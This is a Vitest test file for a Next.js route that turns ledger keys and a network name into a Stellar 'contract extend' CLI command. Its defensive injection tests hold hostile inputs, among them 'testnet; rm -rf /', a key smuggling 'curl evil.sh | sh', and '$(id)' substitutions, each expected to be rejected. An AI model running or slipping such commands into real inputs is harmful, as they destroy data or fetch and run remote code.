import { POST } from "./route";
import { NextRequest } from "next/server";
import { describe, it, expect } from "vitest";

describe("POST /api/ttl-planner", () => {
  it("returns a CLI command for valid input", async () => {
    const req = new NextRequest("http://localhost/api/ttl-planner", {
      method: "POST",
      body: JSON.stringify({
        keys: ["AAAA", "BBBB"],
        newLiveUntilLedger: 5000000,
        network: "testnet",
      }),
      headers: { "Content-Type": "application/json" },
    });
    const res = await POST(req);
    expect(res.status).toBe(200);
    const body = await res.json();
    expect(body.entry_count).toBe(2);
    expect(body.cli_command).toContain("stellar contract extend");
    expect(body.cli_command).toContain("--network testnet");
    expect(body.cli_command).toContain("5000000");
  });

  it("returns 400 when keys is empty", async () => {
    const req = new NextRequest("http://localhost/api/ttl-planner", {
      method: "POST",
      body: JSON.stringify({ keys: [], newLiveUntilLedger: 5000000 }),
      headers: { "Content-Type": "application/json" },
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });

  it("returns 400 when newLiveUntilLedger is missing", async () => {
    const req = new NextRequest("http://localhost/api/ttl-planner", {
      method: "POST",
      body: JSON.stringify({ keys: ["AAAA"] }),
      headers: { "Content-Type": "application/json" },
    });
    const res = await POST(req);
    expect(res.status).toBe(400);
  });

  const post = (payload: unknown) =>
    POST(
      new NextRequest("http://localhost/api/ttl-planner", {
        method: "POST",
        body: JSON.stringify(payload),
        headers: { "Content-Type": "application/json" },
      })
    );

  it("rejects an unknown network", async () => {
    const res = await post({
      keys: ["AAAA"],
      newLiveUntilLedger: 5000000,
      network: "testnet; rm -rf /",
    });
    expect(res.status).toBe(400);
  });

  it.each([
    'AAAA" ; curl evil.sh | sh ; echo "',
    "AAAA$(id)",
    "AAAA`id`",
    "AAAA\nstellar",
    "AAAA BBBB",
    "A".repeat(201),
    "",
  ])("rejects malicious or invalid key %j", async (key) => {
    const res = await post({
      keys: [key],
      newLiveUntilLedger: 5000000,
      network: "testnet",
    });
    expect(res.status).toBe(400);
  });

  it("rejects non-string keys", async () => {
    const res = await post({ keys: [123], newLiveUntilLedger: 5000000 });
    expect(res.status).toBe(400);
  });

  it.each(["5000000; id", 1.5, -1, 0, Number.MAX_SAFE_INTEGER + 2, null])(
    "rejects invalid newLiveUntilLedger %j",
    async (v) => {
      const res = await post({ keys: ["AAAA"], newLiveUntilLedger: v });
      expect(res.status).toBe(400);
    }
  );

  it("rejects a non-object body", async () => {
    const res = await post(null);
    expect(res.status).toBe(400);
  });

  it("accepts all allowed networks", async () => {
    for (const network of ["testnet", "mainnet", "futurenet"]) {
      const res = await post({
        keys: ["AAAA"],
        newLiveUntilLedger: 5000000,
        network,
      });
      expect(res.status).toBe(200);
    }
  });
});
